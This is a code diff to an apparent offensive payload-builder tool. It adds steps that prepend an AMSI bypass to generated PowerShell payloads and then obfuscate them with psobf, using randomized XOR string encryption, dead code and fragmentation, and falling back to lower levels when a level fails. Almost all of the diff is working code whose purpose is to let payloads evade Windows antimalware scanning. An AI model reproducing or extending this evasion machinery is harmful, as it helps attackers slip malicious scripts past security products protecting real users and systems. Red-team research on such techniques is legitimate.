@@ -356,6 +356,45 @@ class PayloadBuilder:
             step.output = f"Template rendered to {source_file}"
             self._update_step(step)
             
+            # Step: Insert AMSI bypass if enabled (BEFORE obfuscation)
+            if (full_template_path.suffix.lower() == '.ps1' and 
+                self.build_options.get('ps_amsi_bypass', False)):
+                
+                amsi_method = self.build_options.get('ps_amsi_method', '')
+                if amsi_method:
+                    amsi_step = BuildStep(f"Inserting AMSI bypass ({amsi_method})", "amsi_bypass")
+                    self.steps.append(amsi_step)
+                    amsi_step.status = "running"
+                    self._update_step(amsi_step)
+                    
+                    success = self._insert_amsi_bypass_template(source_file, amsi_method)
+                    
+                    if success:
+                        amsi_step.status = "success"
+                        amsi_step.output = f"AMSI bypass '{amsi_method}' inserted at beginning of script"
+                        self._update_step(amsi_step)
+                    else:
+                        amsi_step.status = "failed"
+                        amsi_step.error = f"Failed to insert AMSI bypass"
+                        self._update_step(amsi_step)
+            
+            # Step: PowerShell obfuscation if enabled
+            if (full_template_path.suffix.lower() == '.ps1' and 
+                self.build_options.get('ps_obfuscate', False)):
+                
+                obf_level = self.build_options.get('ps_obfuscate_level', 'high')
+                obf_success, obf_file = self._obfuscate_powershell(
+                    source_file, 
+                    output_path, 
+                    output_file,
+                    obf_level
+                )
+                
+                if obf_success:
+                    # Update source_file to point to the obfuscated version
+                    source_file = Path(obf_file)
+                # If obfuscation fails, continue with non-obfuscated version
+            
             # Step: Compile if needed
             compile_config = output_config.get('compile', {})
             if compile_config.get('enabled', False):
@@ -648,4 +687,171 @@ class PayloadBuilder:
             # strip command not available
             return False
         except Exception:
+            return False
+    
+    def _obfuscate_powershell(self, source_file: Path, output_path: Path, 
+                              output_file: str, level: str) -> Tuple[bool, str]:
+        """Obfuscate PowerShell script using psobf with failover
+        
+        Args:
+            source_file: Path to the source PowerShell file
+            output_path: Directory for output files
+            output_file: Desired output filename
+            level: Obfuscation level ('high', 'medium', 'low')
+            
+        Returns:
+            Tuple of (success: bool, output_file_path: str)
+        """
+        import random
+        import string
+        
+        # Prepare temp and final file paths
+        temp_file = source_file  # Input file
+        final_file = output_path / output_file
+        
+        # Define obfuscation levels in order of priority
+        levels = []
+        if level == 'high':
+            levels = ['high', 'medium', 'low']
+        elif level == 'medium':
+            levels = ['medium', 'low']
+        else:
+            levels = ['low']
+        
+        # Try each level with failover
+        for current_level in levels:
+            step_name = f"Obfuscating PowerShell ({current_level.upper()} level)"
+            obf_step = BuildStep(step_name, "obfuscation")
+            self.steps.append(obf_step)
+            obf_step.status = "running"
+            self._update_step(obf_step)
+            
+            # Generate random values for command
+            # Hex key must be even length (2 hex chars = 1 byte), so 8-32 bytes = 16-64 hex chars
+            rand_hex_bytes = random.randint(8, 32)
+            rand_hex_length = rand_hex_bytes * 2  # Ensure even length
+            rand_hex = ''.join(random.choices('0123456789abcdef', k=rand_hex_length))
+            rand_stringdict = random.randint(0, 100)
+            rand_deadcode = random.randint(0, 100)
+            rand_seed = random.randint(0 if current_level != 'high' else 1, 10000)
+            
+            # Build command based on level
+            if current_level == 'high':
+                command = (
+                    f'psobf -i "{temp_file}" -o "{final_file}" -q -level 5 '
+                    f'-pipeline "iden,strenc,stringdict,numenc,fmt,cf,dead,frag" '
+                    f'-iden obf -strenc xor -strkey {rand_hex} '
+                    f'-stringdict {rand_stringdict} -numenc -fmt jitter -cf-opaque '
+                    f'-deadcode {rand_deadcode} -frag profile=medium -seed {rand_seed}'
+                )
+            elif current_level == 'medium':
+                command = (
+                    f'psobf -i "{temp_file}" -o "{final_file}" -q -level 3 '
+                    f'-pipeline "iden,strenc,stringdict,numenc,fmt,cf,dead,frag" '
+                    f'-strenc xor -strkey {rand_hex} -stringdict {rand_stringdict} '
+                    f'-deadcode {rand_deadcode} -fmt jitter -frag profile=medium '
+                    f'-seed {rand_seed}'
+                )
+            else:  # low
+                command = (
+                    f'psobf -i "{temp_file}" -o "{final_file}" '
+                    f'-level 2 -seed {rand_seed}'
+                )
+            
+            obf_step.output = f"Running: {command}"
+            self._update_step(obf_step)
+            
+            try:
+                # Execute psobf command
+                result = subprocess.run(
+                    command,
+                    shell=True,
+                    capture_output=True,
+                    text=True,
+                    timeout=120
+                )
+                
+                # Check if obfuscation was successful
+                if result.returncode == 0 and final_file.exists():
+                    obf_step.status = "success"
+                    obf_step.output = f"Command: {command}\n\nPowerShell obfuscation successful ({current_level} level)"
+                    self._update_step(obf_step)
+                    return True, str(final_file)
+                else:
+                    # Obfuscation failed, log the error
+                    error_msg = result.stderr if result.stderr else result.stdout
+                    obf_step.status = "failed"
+                    obf_step.error = f"Obfuscation failed: {error_msg}"
+                    self._update_step(obf_step)
+                    
+                    # If this isn't the last level, continue to next level
+                    if current_level != levels[-1]:
+                        continue
+                    
+            except subprocess.TimeoutExpired:
+                obf_step.status = "failed"
+                obf_step.error = f"Obfuscation timed out at {current_level} level"
+                self._update_step(obf_step)
+                
+                # Try next level
+                if current_level != levels[-1]:
+                    continue
+                    
+            except Exception as e:
+                obf_step.status = "failed"
+                obf_step.error = f"Obfuscation error: {str(e)}"
+                self._update_step(obf_step)
+                
+                # Try next level
+                if current_level != levels[-1]:
+                    continue
+        
+        # All levels failed, add warning step and continue without obfuscation
+        warning_step = BuildStep("Obfuscation skipped", "warning")
+        self.steps.append(warning_step)
+        warning_step.status = "success"
+        warning_step.output = "All obfuscation levels failed, continuing with non-obfuscated script"
+        self._update_step(warning_step)
+        
+        # Copy the original file to final destination
+        import shutil
+        shutil.copy2(temp_file, final_file)
+        
+        return True, str(final_file)
+    
+    def _insert_amsi_bypass_template(self, ps1_file: Path, bypass_method: str) -> bool:
+        """Insert AMSI bypass at the beginning of a PowerShell template
+        
+        Args:
+            ps1_file: Path to the PowerShell file
+            bypass_method: Name of the bypass method to use
+            
+        Returns:
+            True if successful, False otherwise
+        """
+        try:
+            # Load bypass code
+            amsi_dir = self.config.templates_dir / 'amsi_bypasses'
+            bypass_file = amsi_dir / f"{bypass_method.replace(' ', '_')}.ps1"
+            
+            if not bypass_file.exists():
+                return False
+            
+            with open(bypass_file, 'r') as f:
+                bypass_code = f.read().strip()
+            
+            # Read existing file
+            with open(ps1_file, 'r') as f:
+                original_code = f.read()
+            
+            # Insert bypass at the beginning
+            modified_code = f"{bypass_code}\n\n{original_code}"
+            
+            # Write back
+            with open(ps1_file, 'w') as f:
+                f.write(modified_code)
+            
+            return True
+            
+        except Exception as e:
             return False
